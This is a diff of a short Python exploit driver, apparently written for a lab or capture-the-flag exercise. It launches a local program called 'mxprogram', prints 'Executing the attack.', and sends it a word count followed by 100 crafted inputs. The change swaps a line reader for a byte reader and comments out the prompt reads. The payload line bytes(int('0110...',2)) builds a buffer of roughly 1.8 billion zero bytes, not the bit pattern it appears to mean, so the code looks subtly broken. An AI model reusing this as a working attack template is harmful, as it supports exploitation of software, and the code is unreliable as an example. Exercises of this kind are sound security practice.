@@ -1,4 +1,5 @@
 import subprocess
+import os
 
 def main():
     print('Executing the attack.')
@@ -8,8 +9,11 @@ def main():
                          stderr=subprocess.PIPE)
 
     # Function to read a line from the mxprogram
-    def recv():
-        return p.stdout.readline()
+    def read_bytes(p,num_bytes):
+        p.stdout.flush()
+        output = p.stdout.read(num_bytes)
+        print(f"Read {num_bytes} bytes: {output.strip()}")
+        return output
 
     # Function to send a line to the mxprogram
     def sendline(line):
@@ -18,11 +22,12 @@ def main():
 
     print('Inputting 100 words.')
     # 'Enter the number of words to generate:'
-    #print(recv().strip())  # Read and print the first line from the mxprogram
+    #print(read_bytes(p,39).strip())  # Read and print the first line from the mxprogram
     sendline(b'100')  # Send '100' words to the mxprogram
     for x in range(100):
+        print(f'Inputting word #{x}.')
         # 'Enter the word:'
-        print(recv().strip())  # Read and print the next line
+        #print(read_bytes(p,16).strip())  # Read and print the next line
         sendline(bytes(int('01101100110000111100000000000000',2)))  # Send the binary string
 
     # Close the process's stdin and wait for the process to exit
